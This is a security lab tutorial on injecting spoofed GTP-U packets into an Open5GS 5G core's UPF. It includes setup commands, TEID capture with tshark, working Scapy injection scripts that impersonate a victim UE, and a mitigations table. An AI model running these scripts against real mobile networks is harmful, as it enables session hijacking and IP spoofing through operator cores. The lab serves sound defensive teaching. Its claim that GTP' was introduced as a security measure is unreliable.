# GTP-U Tunneling Exploit Lab
### Hacking 5G — User Plane Injection on Open5GS

> **Scope:** Educational security research lab. All testing must be performed in an isolated, self-contained environment. Do not run this against any production or public 5G infrastructure.

---

## Table of Contents

1. [Background & Theory](#1-background--theory)
2. [Lab Architecture](#2-lab-architecture)
3. [Prerequisites & Tools](#3-prerequisites--tools)
4. [Phase 1 — Environment Setup](#4-phase-1--environment-setup)
5. [Phase 2 — Verify the Core Network](#5-phase-2--verify-the-core-network)
6. [Phase 3 — Recon & Traffic Capture](#6-phase-3--recon--traffic-capture)
7. [Phase 4 — The GTP-U Injection Exploit](#7-phase-4--the-gtp-u-injection-exploit)
8. [Phase 5 — Observe & Document](#8-phase-5--observe--document)
9. [Mitigations](#9-mitigations)
10. [Further Reading & Resources](#10-further-reading--resources)

---

## 1. Background & Theory

### What is GTP-U?

**GPRS Tunneling Protocol — User Plane (GTP-U)** is the protocol used in 4G/5G mobile core networks to carry user data (IP packets) between the radio access network and the core. In 5G Standalone (SA) architecture:

- The **gNB** (5G base station) encapsulates UE traffic in GTP-U packets and sends them to the **UPF** (User Plane Function) over the **N3 interface**.
- Each tunnel is identified by a **TEID** (Tunnel Endpoint Identifier) — a 32-bit value assigned during PDU session setup.
- The UPF decapsulates GTP-U packets and forwards the inner IP packets to the internet (or data network).

```
UE ──► gNB ──[GTP-U / UDP 2152]──► UPF ──► Internet
              N3 Interface
```

### The Vulnerability

The GTP-U data plane has **no authentication**. The UPF trusts any GTP-U packet that arrives on UDP port 2152 containing a valid TEID. This means:

- An attacker with network access to the N3 interface (between gNB and UPF) can **inject arbitrary GTP-U packets**.
- The UPF will decapsulate the spoofed packet and forward the inner IP payload as if it came from a legitimate UE.
- The attacker can **hijack another UE's session**, send traffic under a victim's IP, or perform **IP spoofing** through the core.

This is not a new class of bug — it is a fundamental design choice of GTP that assumed the N3 link was a trusted operator network. In practice, insider threats, compromised gNBs, or misconfigured networks expose this surface.

### Why This Still Matters in 5G

In 4G (LTE) the same issue existed. 3GPP introduced **GPRS Tunneling Protocol — Prime (GTP')** and recommended IPsec on N3, but:

- Many deployments skip IPsec for performance reasons.
- Open-source cores like Open5GS do not enforce it by default.
- Cloud-native 5G deployments may expose N3 on flat Kubernetes pod networks.

---

## 2. Lab Architecture

```
┌─────────────────────────────────────────────────────────┐
│                    Your Linux Machine                   │
│                                                         │
│  ┌─────────────┐    N2 (NGAP)   ┌──────────────────┐   │
│  │  UERANSIM   │◄──────────────►│  Open5GS AMF     │   │
│  │  (gNB + UE) │                │  Open5GS SMF     │   │
│  │             │    N3 (GTP-U)  │  Open5GS UPF     │   │
│  │             │◄──────────────►│                  │   │
│  └─────────────┘   UDP :2152    └────────┬─────────┘   │
│                                          │              │
│                                    ┌─────▼──────┐       │
│                                    │   ogstun   │       │
│                                    │ 10.45.0.1  │       │
│                                    └────────────┘       │
│                                                         │
│  ┌─────────────┐                                        │
│  │  Attacker   │──► Scapy GTP-U inject ──► UPF:2152    │
│  │  (Scapy)    │                                        │
│  └─────────────┘                                        │
└─────────────────────────────────────────────────────────┘
```

**Key interfaces:**

| Interface | Protocol | Port | Role |
|-----------|----------|------|------|
| N2 | NGAP / SCTP | 38412 | Control plane: AMF ↔ gNB |
| N3 | GTP-U / UDP | 2152 | User plane: UPF ↔ gNB |
| ogstun | TUN (Linux) | — | UPF injects/reads decap'd packets |

---

## 3. Prerequisites & Tools

### System Requirements

- Ubuntu 22.04 / 24.04 (or Debian equivalent)
- 4 GB RAM minimum, 8 GB recommended
- Root / sudo access

### Tools Needed

| Tool | Purpose | Install |
|------|---------|---------|
| Open5GS | 5G SA core network | `apt install open5gs` |
| UERANSIM | 5G gNB + UE simulator | Build from source |
| Scapy | Packet crafting & injection | `pip install scapy` |
| Wireshark / tshark | GTP-U capture & analysis | `apt install wireshark` |
| tcpdump | Live packet capture | `apt install tcpdump` |
| iproute2 | TUN interface management | pre-installed |

---

## 4. Phase 1 — Environment Setup

### 4.1 Install Open5GS

```bash
sudo apt update && sudo apt install -y software-properties-common
sudo add-apt-repository ppa:open5gs/latest
sudo apt update && sudo apt install -y open5gs

# Verify services installed
systemctl list-units open5gs-* --all
```

### 4.2 Configure the UPF (ogstun)

Open5GS creates the `ogstun` TUN interface automatically when the UPF starts. Check the UPF config:

```bash
cat /etc/open5gs/upf.yaml
```

Key section to verify:

```yaml
upf:
  pfcp:
    - addr: 127.0.0.7
  gtpu:
    - addr: 127.0.0.7       # N3 listen address
  subnet:
    - addr: 10.45.0.1/16    # UE IP pool
    - addr: 2001:db8:cafe::1/48
```

Bring `ogstun` up manually if needed:

```bash
sudo ip tuntap add name ogstun mode tun
sudo ip addr add 10.45.0.1/16 dev ogstun
sudo ip link set ogstun up mtu 1400
ip link show ogstun   # verify state
```

### 4.3 Install UERANSIM

```bash
sudo apt install -y make gcc g++ libsctp-dev lksctp-tools iproute2
git clone https://github.com/aligungr/UERANSIM
cd UERANSIM
make -j$(nproc)
```

### 4.4 Enable IP Forwarding

```bash
sudo sysctl -w net.ipv4.ip_forward=1
echo "net.ipv4.ip_forward=1" | sudo tee -a /etc/sysctl.conf
```

### 4.5 Start Open5GS Services

```bash
sudo systemctl start open5gs-nrfd
sudo systemctl start open5gs-amfd
sudo systemctl start open5gs-smfd
sudo systemctl start open5gs-upfd
sudo systemctl start open5gs-ausfd
sudo systemctl start open5gs-udmd
sudo systemctl start open5gs-pcfd

# Watch UPF logs
journalctl -u open5gs-upfd -f
```

---

## 5. Phase 2 — Verify the Core Network

### 5.1 Register a Test Subscriber

Use the Open5GS WebUI (port 3000) or the CLI to add a subscriber:

```bash
# Start WebUI
cd /usr/lib/node_modules/open5gs
node server/index.js
# Visit http://localhost:3000 — default admin:1423
```

Add subscriber with:
- IMSI: `999700000000001`
- Key (Ki): `465B5CE8B199B49FAA5F0A2EE238A6BC`
- OPc: `E8ED289DEBA952E4283B54E88E6183CA`

### 5.2 Start UERANSIM gNB & UE

```bash
# Terminal 1 — start gNB
cd UERANSIM
sudo ./build/nr-gnb -c config/open5gs-gnb.yaml

# Terminal 2 — start UE
sudo ./build/nr-ue -c config/open5gs-ue.yaml
```

### 5.3 Confirm PDU Session

```bash
# Check UE got an IP
ip addr show uesimtun0
# Expected: 10.45.0.x

# Test connectivity through the tunnel
ping -I uesimtun0 8.8.8.8

# Confirm ogstun is carrying traffic
sudo tcpdump -i ogstun -n
```

If you see ICMP through `ogstun` — your 5G core is fully functional.

---

## 6. Phase 3 — Recon & Traffic Capture

### 6.1 Capture GTP-U Packets

```bash
sudo tcpdump -i lo -w gtpu_capture.pcap udp port 2152 -v
```

Run some UE traffic in parallel (`ping -I uesimtun0 8.8.8.8`), then stop the capture.

### 6.2 Analyze in Wireshark

Open `gtpu_capture.pcap` in Wireshark:

1. Filter: `gtp`
2. Expand a GTP-U packet: `GTPv1-U > Header`
3. **Note the TEID value** (e.g. `0x00000001`) — this is what you will spoof.
4. Note the source IP (gNB address) and destination IP (UPF N3 address).

From the command line:

```bash
tshark -r gtpu_capture.pcap -T fields \
  -e ip.src -e ip.dst \
  -e gtp.teid -e gtp.message_type \
  -Y "gtp"
```

### 6.3 Key Values to Record

```
UPF N3 IP   : 127.0.0.7    (from upf.yaml gtpu.addr)
gNB IP      : 127.0.0.5    (from UERANSIM gnb config)
UPF UDP port: 2152
TEID        : 0x00000001   (from Wireshark capture)
UE PDU IP   : 10.45.0.2    (from uesimtun0)
```

---

## 7. Phase 4 — The GTP-U Injection Exploit

### 7.1 Install Scapy with GTP Support

```bash
pip install scapy
# GTP contrib module is included in Scapy >= 2.4.5
python3 -c "from scapy.contrib.gtp import *; print('GTP OK')"
```

### 7.2 Basic GTP-U Injection (ICMP)

```python
#!/usr/bin/env python3
# gtp_inject.py — basic GTP-U injection proof of concept

from scapy.all import *
from scapy.contrib.gtp import GTP_U_Header

# === Fill these from your Phase 3 recon ===
UPF_IP    = "127.0.0.7"    # UPF N3 address (destination)
GNB_IP    = "127.0.0.5"    # gNB address (spoofed source)
TEID      = 0x00000001     # TEID from Wireshark
UE_IP     = "10.45.0.2"    # UE's assigned PDU session IP
TARGET_IP = "8.8.8.8"      # internet target (in your lab: any reachable IP)

pkt = (
    IP(src=GNB_IP, dst=UPF_IP) /       # outer IP: gNB → UPF
    UDP(sport=2152, dport=2152) /       # GTP-U UDP port
    GTP_U_Header(teid=TEID) /          # GTP-U header with stolen TEID
    IP(src=UE_IP, dst=TARGET_IP) /     # inner IP: spoofed as UE
    ICMP()                              # payload
)

print("[*] Crafted packet:")
pkt.show()
print(f"\n[*] Sending to {UPF_IP}:2152 with TEID={hex(TEID)}")
send(pkt, verbose=True)
print("[+] Done. Check ogstun with tcpdump.")
```

Run it:

```bash
sudo python3 gtp_inject.py
```

### 7.3 Advanced — TCP Session Injection

```python
#!/usr/bin/env python3
# gtp_tcp_inject.py — inject TCP traffic through victim UE tunnel

from scapy.all import *
from scapy.contrib.gtp import GTP_U_Header

UPF_IP  = "127.0.0.7"
GNB_IP  = "127.0.0.5"
TEID    = 0x00000001
UE_IP   = "10.45.0.2"

# Craft a TCP SYN as if from victim UE
pkt = (
    IP(src=GNB_IP, dst=UPF_IP) /
    UDP(sport=2152, dport=2152) /
    GTP_U_Header(teid=TEID) /
    IP(src=UE_IP, dst="1.1.1.1") /
    TCP(sport=RandShort(), dport=80, flags="S")
)

send(pkt, count=5, inter=0.1)
```

### 7.4 What the UPF Does With Your Packet

```
Attacker
  │
  │  GTP-U packet (outer IP: gNB→UPF, TEID=stolen)
  ▼
UPF (open5gs-upfd)
  │
  │  Looks up TEID → finds PDU session → decapsulates
  │  Extracts inner IP packet (src: UE IP)
  ▼
ogstun (10.45.0.1)
  │
  │  Routes inner packet to internet/data network
  ▼
Target (8.8.8.8 or lab host)
```

The UPF does **not** verify that the outer source IP matches the registered gNB. It only checks the TEID.

---

## 8. Phase 5 — Observe & Document

### 8.1 Confirm Injection on ogstun

In a second terminal, watch `ogstun` during injection:

```bash
sudo tcpdump -i ogstun -n -v
```

If you see your injected ICMP or TCP packet appear here — the exploit is confirmed. The UPF has decapsulated your spoofed packet and pushed it into the data network exactly as if it came from the legitimate UE.

### 8.2 Check UPF Logs

```bash
journalctl -u open5gs-upfd -n 50 --no-pager
```

Look for session lookup entries corresponding to your TEID.

### 8.3 Use tshark to Correlate

```bash
# Capture both the inject and the result
sudo tcpdump -i any -w full_exploit.pcap &
sudo python3 gtp_inject.py
sleep 3
sudo pkill tcpdump

# In Wireshark: follow the outer GTP packet then find the decap'd inner on ogstun
tshark -r full_exploit.pcap -Y "gtp or (ip.dst == 8.8.8.8 and icmp)"
```

### 8.4 Document Your Findings

For your lab report, capture:

- The TEID value used
- Wireshark screenshot showing GTP-U encapsulation
- tcpdump output on `ogstun` showing the decapsulated inner packet
- Whether NAT masquerading was applied
- Any UPF log lines confirming session lookup

---

## 9. Mitigations

| Mitigation | Description |
|-----------|-------------|
| **IPsec on N3** | Encrypt and authenticate all GTP-U traffic between gNB and UPF. Defined in 3GPP TS 33.501. |
| **Network segmentation** | Put the N3 interface on a dedicated VLAN/VRF isolated from attacker-reachable segments. |
| **TEID entropy** | Use cryptographically random TEIDs (32-bit) — makes guessing impractical but doesn't stop capture-and-replay. |
| **Firewall rules** | Whitelist only the registered gNB IPs on UDP 2152 at the UPF. |
| **GTP firewall (P-GW/UPF)** | Products like `gtp-guard` inspect and rate-limit GTP-U flows. |
| **UPF source IP validation** | Reject GTP-U packets whose outer source IP does not match the registered N3 address for that TEID. Open5GS does not do this by default. |

---

## 10. Further Reading & Resources

### Standards & Specifications

- **3GPP TS 29.281** — GTP-U specification (the core protocol document)
  https://www.3gpp.org/ftp/Specs/archive/29_series/29.281/

- **3GPP TS 33.501** — Security architecture and procedures for 5G
  https://www.3gpp.org/ftp/Specs/archive/33_series/33.501/

- **3GPP TS 23.501** — 5G system architecture (explains N3, UPF role)
  https://www.3gpp.org/ftp/Specs/archive/23_series/23.501/

### Open Source Projects

- **Open5GS** — 5G SA and 4G/EPC core implementation
  https://github.com/open5gs/open5gs
  https://open5gs.org/open5gs/docs/

- **UERANSIM** — 5G UE and gNB simulator
  https://github.com/aligungr/UERANSIM

- **free5GC** — Alternative open-source 5G core (Go-based)
  https://github.com/free5gc/free5gc

- **Scapy GTP contrib** — GTP-U packet crafting
  https://github.com/secdev/scapy/blob/master/scapy/contrib/gtp.py

### Security Research & Papers

- **"GTP: Sorry, state of affairs"** — P1 Security research on GTP vulnerabilities in operator networks
  https://www.p1sec.com/corp/ressources/publications/

- **Positive Technologies GTP research (2018–2021)** — Detailed attack taxonomy on GTP in 4G/5G
  https://www.ptsecurity.com/ww-en/analytics/telecom-vulnerabilities/

- **"5G Security: Vulnerabilities, Threats, and Solutions"** — IEEE survey paper
  Search: IEEE Xplore "5G security GTP vulnerabilities"

- **"Hacking LTE World"** — Ralf-Philipp Weinmann, DEF CON 2012
  Foundational talk on mobile core exploitation (still relevant for GTP)
  https://www.youtube.com/watch?v=gfcq8clu1RI

- **CVE-2021-38149** and related GTP CVEs — search NVD:
  https://nvd.nist.gov/vuln/search/results?query=GTP

### CTF & Hands-on Labs

- **5G Hacking Village (DEF CON)** — Annual CTF challenges on 5G core
  https://www.5ghackingvillage.com/

- **Open5GS + UERANSIM lab guide (nickvsnetworking.com)**
  https://nickvsnetworking.com/my-5g-home-lab/

- **PacketRusher** — Alternative 5G UE simulator (useful for load testing & fuzzing)
  https://github.com/HewlettPackard/PacketRusher

### Tools for Deeper Testing

| Tool | Use |
|------|-----|
| `gtp-guard` | GTP firewall / rate limiting |
| `osmocom-bb` | Low-level GSM/LTE radio stack |
| `srsRAN` | Software-defined RAN (real radio testing) |
| `Magnus` (P1 Security) | Commercial GTP security scanner |
| Wireshark GTP dissector | Built-in; enable via Analyze > Decode As > GTP |

### YouTube / Video Learning

- **5G Core Network Deep Dive** — networklessons.com series on 5G SA architecture
- **Mobile Network Security** — Black Hat & DEF CON talks playlist
  Search YouTube: "GTP security DEF CON" / "5G core hacking"

---

*Lab written for educational purposes. Always obtain explicit written authorization before testing any network you do not own.*
